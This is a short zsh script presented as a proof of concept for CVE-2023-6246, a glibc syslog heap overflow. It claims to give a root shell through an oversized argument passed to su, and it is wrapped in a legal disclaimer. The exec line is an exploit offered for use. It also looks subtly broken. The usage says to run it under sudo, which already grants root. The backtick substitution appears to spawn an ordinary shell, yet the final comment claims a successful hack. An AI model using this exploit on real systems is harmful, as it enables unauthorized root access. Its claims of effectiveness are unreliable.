#!/usr/bin/zsh
################################################################################
# $Id: cve-2023-6246... 2024-02-01 18-54-19 +0100 .m0rph $
################################################################################
# Description:
#
# +------------------------------------------------------------------------+
# | See poc.cve-2023-6246.heap-based-buffer-overflow-in-glibc.s-syslog.txt |
# +------------------------------------------------------------------------+
#
# ------------------------------------------------------------------------------
# Does a privilege escalation
#
# Usage:
#
#  $ sudo ./poc.cve-2023-6246
#
# ------------------------------------------------------------------------------
# How to check which glibc is installed:
#
#  $ ldd --version
#
# ------------------------------------------------------------------------------
# Disclaimer:
#  This Proof of Concept (PoC) is intended for research and educational purposes
#  only. Any actions taken based on the information provided in this gist are
#  solely at the user's own risk. The vulnerabilities described in this report
#  should not be exploited in any unauthorized or malicious manner. The authors
#  and contributors are not responsible for any misuse or damage that may
#  result from the use of this information.
#
# Please keep in mind that using malicious software and causing damage at
# foreign systems without being ordered or charged is ILLEGAL and will result in
# law enforcement! 
#
# Worst case is: YOU WILL END UP IN PRISON!
#
################################################################################

# Here we use the Proof of Concept (PoC) to gain a root shell
# of the buffer overflow, a so called privilege escalation.
exec -a `printf '%0128000x' 1;sh 0<&2 1>&2` /usr/bin/su < /dev/null

print -l 'Does he print that?' # nope, he doesn't, just got hacked !!!


# EOF
